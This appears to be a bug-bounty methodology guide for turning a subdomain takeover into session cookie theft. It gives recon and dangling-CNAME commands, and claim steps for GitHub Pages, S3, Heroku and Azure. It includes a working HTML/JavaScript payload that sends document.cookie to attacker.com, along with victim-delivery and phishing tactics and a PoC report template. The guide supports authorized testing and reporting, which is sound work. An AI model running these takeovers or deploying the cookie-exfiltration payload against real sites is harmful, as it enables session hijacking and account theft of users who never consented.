Subdomain Takeover to Cookie Theft
Why This Chain Works
A subdomain takeover on its own is a medium. You can host phishing content on a legitimate-looking domain. That's real but limited. The critical escalation happens when the target sets cookies with Domain=.target.com or doesn't set the domain attribute at all (which defaults to the full host, BUT if the session cookie is scoped to *.target.com via explicit domain attribute, a takeover on any subdomain gives you cookie access). That transforms a takeover into a session hijack at scale.

Step-by-Step
1. Find Dangling CNAMEs
I use a combination of amass, subfinder, and httpx, then pipe the subdomains through a takeover checker.
subfinder -d target.com -silent | tee subs.txt
amass enum -d target.com -o amass_subs.txt
cat subs.txt amass_subs.txt | sort -u | httpx -silent -status-code | tee live.txt
 
# Check for dangling CNAMEs
subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/tools/subjack/fingerprints.json
# or
nuclei -l subs.txt -t takeovers/
2. Identify the Service
When you find a subdomain returning a 404 or error from a third-party service, check the CNAME chain:
dig CNAME staging.target.com
# staging.target.com. 300 IN CNAME target-staging.github.io.
# target-staging.github.io. 300 IN A ...
If target-staging.github.io doesn't exist as a GitHub Pages site, you can claim it.
3. Common Takeover Targets and Claim Process
GitHub Pages:
1. Create repo: github.com/yourhandle/target-staging (or whatever matches the CNAME)
2. Enable GitHub Pages on the repo
3. Add CNAME file with the subdomain: staging.target.com
4. Verify: curl staging.target.com returns your content
AWS S3:
# CNAME points to target-bucket.s3-website-us-east-1.amazonaws.com
# Create a bucket in us-east-1 named exactly "target-bucket"
aws s3 mb s3://target-bucket --region us-east-1
aws s3 website s3://target-bucket --index-document index.html
# Upload test content
echo "takeover proof" | aws s3 cp - s3://target-bucket/index.html --acl public-read
Heroku:
# CNAME points to target-app.herokuapp.com
heroku create target-app
# Add custom domain
heroku domains:add staging.target.com --app target-app
Azure:
# CNAME points to target.azurewebsites.net or target.blob.core.windows.net
# For blob: create storage account and container matching the name
# For App Service: create App Service with matching name
4. Check Cookie Scope
After confirming the takeover, check what cookies the main app sets:
Set-Cookie: session=abc123; Domain=.target.com; Path=/; Secure; HttpOnly
Key things to check:

Domain=.target.com (the dot prefix means all subdomains, your claimed subdomain is included)
HttpOnly flag: if set, JavaScript CANNOT read this cookie via document.cookie. The theft fails.
Secure flag: doesn't prevent reading from JS, only prevents sending over HTTP.
SameSite: if SameSite=Strict, cross-site navigation won't send the cookie. But if the user navigates directly to your subdomain URL, SameSite doesn't protect against that.

If HttpOnly is set, session cookie theft via JS is blocked. But you can still:

Host malicious content that looks legitimate (phishing)
Bypass CSP (if *.target.com is allowed in connect-src)
Abuse CORS policies that trust *.target.com
Mount subdomain-based CSRF attacks

5. Cookie Theft Payload
If the session cookie is NOT HttpOnly and is scoped to .target.com:
<!-- index.html on your claimed subdomain -->
<!DOCTYPE html>
<html>
<body>
<script>
// Grab all cookies accessible from this subdomain
var cookies = document.cookie;
// Exfil
new Image().src = 'attacker.com/log#039; + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(document.location.href);
 
// Or use fetch if CSP allows it
fetch('attacker.com/log', {
  method: 'POST',
  body: JSON.stringify({cookies: cookies, ts: Date.now()}),
  headers: {'Content-Type': 'application/json'}
});
</script>
<p>Loading...</p>
</body>
</html>
6. Deliver to Victim
The victim needs to visit your claimed subdomain while authenticated on the main app. Delivery options:

Send a direct link (the subdomain looks legitimate)
Embed it as an iframe or redirect on another page
If you find an open redirect on the main domain, use that to redirect users to your subdomain
Abuse any "invite" or "share" feature that generates links


When HttpOnly Blocks Cookie Theft
Even with HttpOnly, document the takeover thoroughly and note the escalation potential:

CSP bypass: If the app's CSP includes script-src *.target.com, you can load scripts from your subdomain into the main app (requires XSS or another injection point on the main domain).
CORS abuse: If Access-Control-Allow-Origin trusts *.target.com, authenticated API requests can be made from your subdomain.
OAuth/SSO abuse: If the subdomain is registered as an OAuth callback, it's a different chain entirely (see Open Redirect to ATO).
Credential phishing: Host a convincing login page. The URL is real.


PoC Template for Report
1. Subdomain: staging.target.com
2. DNS: dig CNAME staging.target.com returns target-staging.github.io
3. target-staging.github.io did not exist as a GitHub Pages site
4. Claimed via GitHub Pages on repo: github.com/bbproof/target-staging
5. staging.target.com now serves content from that repo (screenshot)
6. Cookie check: Set-Cookie: session=...; Domain=.target.com (no HttpOnly flag)
7. Hosted cookie-theft payload on staging.target.com/steal.html
8. Visited page while authenticated on target.com - cookie received at attacker.com
9. Replayed cookie on target.com/api/me - returns victim account details (screenshot)

Reporting Notes
Always check the HttpOnly flag before claiming full session theft. If it's set, still report the takeover but be accurate about impact. A takeover with HttpOnly is a medium. Without HttpOnly plus domain-scoped cookie is a critical. Show the full chain: DNS evidence, claim, cookie inspection, theft payload, and replayed session.
